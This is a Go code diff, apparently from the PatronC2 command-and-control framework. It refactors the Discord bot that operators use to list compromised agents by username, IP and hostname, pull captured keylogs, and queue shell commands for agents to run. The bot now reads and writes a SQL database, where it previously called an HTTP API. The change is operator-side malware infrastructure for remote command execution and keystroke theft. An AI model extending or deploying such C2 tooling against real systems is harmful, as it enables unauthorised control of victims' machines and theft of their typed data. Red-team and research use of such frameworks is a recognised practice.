@@ -1,18 +1,14 @@
 package command
 
 import (
-	"bytes"
-	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
 	"regexp"
+	"database/sql"
 	"strings"
-	"time"
 
-	"github.com/PatronC2/Patron/types"
+	"github.com/PatronC2/Patron/data"
 	"github.com/bwmarrin/discordgo"
 	"github.com/google/uuid"
 	"github.com/joho/godotenv"
@@ -52,36 +48,16 @@ func sendAgentMessage(agents string, title string) *discordgo.MessageSend {
 		},
 		},
 	}
+	fmt.Printf("type = %T\n", sendMsg)
+	fmt.Printf("content = %#v\n", sendMsg.Embeds)
 	return sendMsg
 }
 
-func GetBotAgents() *discordgo.MessageSend {
-	apiserver := goDotEnvVariable("WEBSERVER_IP")
-	apiport := goDotEnvVariable("WEBSERVER_PORT")
-	apiURL := fmt.Sprintf("http://%s:%s/api/agents", apiserver, apiport)
-	// fmt.Println(apiURL)
-	// Create new HTTP client & set timeout
-	client := http.Client{Timeout: 5 * time.Second}
-
-	// Query C2 API
-	response, err := client.Get(apiURL)
-	if err != nil {
-		return &discordgo.MessageSend{
-			Content: "Http api Error! trying to get agents",
-		}
-	}
-
-	// Open HTTP response body
-	body, _ := ioutil.ReadAll(response.Body)
-	defer response.Body.Close()
-
-	// Convert JSON
-	var data types.BotConfigAgent
-	json.Unmarshal([]byte(body), &data)
-	// fmt.Println(data[0].Uuid)
+func GetBotAgents(db *sql.DB) *discordgo.MessageSend {
 	var results strings.Builder
-	for i := range data {
-		fmt.Fprintf(&results, "%s %s@%s %s <%s>\n", data[i].Uuid, data[i].Username, data[i].AgentIP, data[i].Hostname, data[i].Status)
+	// fmt.Println(db)
+	for i := range data.Agents(db) {
+		fmt.Fprintf(&results, "%s %s@%s %s <%s>\n", data.Agents(db)[i].Uuid, data.Agents(db)[i].Username, data.Agents(db)[i].AgentIP, data.Agents(db)[i].Hostname, data.Agents(db)[i].Status)
 	}
 	// fmt.Println(results.String())
 
@@ -98,9 +74,7 @@ func GetBotAgents() *discordgo.MessageSend {
 	}
 }
 
-func GetBotAgent(message string) *discordgo.MessageSend {
-	apiserver := goDotEnvVariable("WEBSERVER_IP")
-	apiport := goDotEnvVariable("WEBSERVER_PORT")
+func GetBotAgent(db *sql.DB, message string) *discordgo.MessageSend {
 	botmsg := strings.Split(message, " ")
 
 	if len(botmsg) <= 1 {
@@ -113,32 +87,14 @@ func GetBotAgent(message string) *discordgo.MessageSend {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
-	}
-
-	apiURL := fmt.Sprintf("http://%s:%s/api/agent/%s", apiserver, apiport, botmsg[1])
-	// fmt.Println(apiURL)
-	// Create new HTTP client & set timeout
-	client := http.Client{Timeout: 5 * time.Second}
-
-	// Query C2 API
-	response, err := client.Get(apiURL)
-	if err != nil {
+	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
 		return &discordgo.MessageSend{
-			Content: "Http api Error! trying to get agent",
+			Content: "Error! Invalid uuid",
 		}
 	}
-
-	// Open HTTP response body
-	body, _ := ioutil.ReadAll(response.Body)
-	defer response.Body.Close()
-
-	// Convert JSON
-	var data types.BotAgent
-	json.Unmarshal([]byte(body), &data)
-	// fmt.Println(data[0].Uuid)
 	var results strings.Builder
-	for i := range data {
-		fmt.Fprintf(&results, "`Command:` %s \n`Output:` %s", data[i].Command, data[i].Output)
+	for i := range data.Agent(db, botmsg[1]) {
+		fmt.Fprintf(&results, "`Command:` %s \n`Output:` %s", data.Agent(db, botmsg[1])[i].Command, data.Agent(db, botmsg[1])[i].Output)
 	}
 	//fmt.Println(results.String())
 
@@ -154,9 +110,7 @@ func GetBotAgent(message string) *discordgo.MessageSend {
 	}
 }
 
-func GetBotKeys(message string) *discordgo.MessageSend {
-	apiserver := goDotEnvVariable("WEBSERVER_IP")
-	apiport := goDotEnvVariable("WEBSERVER_PORT")
+func GetBotKeys(db *sql.DB, message string) *discordgo.MessageSend {
 	botmsg := strings.Split(message, " ")
 
 	if len(botmsg) <= 1 {
@@ -169,31 +123,14 @@ func GetBotKeys(message string) *discordgo.MessageSend {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
-	}
-
-	apiURL := fmt.Sprintf("http://%s:%s/api/keylog/%s", apiserver, apiport, botmsg[1])
-	// fmt.Println(apiURL)
-	// Create new HTTP client & set timeout
-	client := http.Client{Timeout: 5 * time.Second}
-
-	// Query C2 API
-	response, err := client.Get(apiURL)
-	if err != nil {
+	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
 		return &discordgo.MessageSend{
-			Content: "Http api Error! trying to get agent",
+			Content: "Error! Invalid uuid",
 		}
 	}
 
-	// Open HTTP response body
-	body, _ := ioutil.ReadAll(response.Body)
-	defer response.Body.Close()
-
-	// Convert JSON
-	var data types.KeyReceiveBot
-	json.Unmarshal([]byte(body), &data)
-	// fmt.Println(data[0].Keys)
 	var results strings.Builder
-	fmt.Fprintf(&results, "`Keylog:` %s", data[0].Keys)
+	fmt.Fprintf(&results, "`Keylog:` %s", data.Keylog(db, botmsg[1])[0].Keys)
 	//fmt.Println(results.String())
 
 	// trims charaters
@@ -208,9 +145,8 @@ func GetBotKeys(message string) *discordgo.MessageSend {
 	}
 }
 
-func PostBotCmd(message string) *discordgo.MessageSend {
-	apiserver := goDotEnvVariable("WEBSERVER_IP")
-	apiport := goDotEnvVariable("WEBSERVER_PORT")
+func PostBotCmd(db *sql.DB, message string) *discordgo.MessageSend {
+	newCmdID := uuid.New().String()
 	botmsg := strings.Split(message, " ")
 
 	if len(botmsg) <= 1 {
@@ -220,6 +156,10 @@ func PostBotCmd(message string) *discordgo.MessageSend {
 	}
 	// fmt.Println(botmsg)
 	if !IsValidUUID(botmsg[1]) {
+		return &discordgo.MessageSend{
+			Content: "Error! Invalid uuid",
+		}
+	} else if data.FetchOneAgent(db, botmsg[1]).Uuid == "" {
 		return &discordgo.MessageSend{
 			Content: "Error! Invalid uuid",
 		}
@@ -235,22 +175,7 @@ func PostBotCmd(message string) *discordgo.MessageSend {
 		}
 	}
 
-	requestBody := types.BotCommand{Command: command[1]}
-	jsonValue, _ := json.Marshal(requestBody)
-
-	apiURL := fmt.Sprintf("http://%s:%s/api/agent/%s", apiserver, apiport, botmsg[1])
-	// fmt.Println(apiURL)
-	// Create new HTTP client & set timeout
-	client := http.Client{Timeout: 5 * time.Second}
-
-	// Query C2 API
-
-	_, err := client.Post(apiURL, "application/json", bytes.NewBuffer(jsonValue))
-	if err != nil {
-		return &discordgo.MessageSend{
-			Content: "Http api Error! trying to post cmd",
-		}
-	}
+	data.SendAgentCommand(db, botmsg[1], "0", "shell", command[1], newCmdID)
 
 	return &discordgo.MessageSend{
 		Content: "!refresh " + botmsg[1],
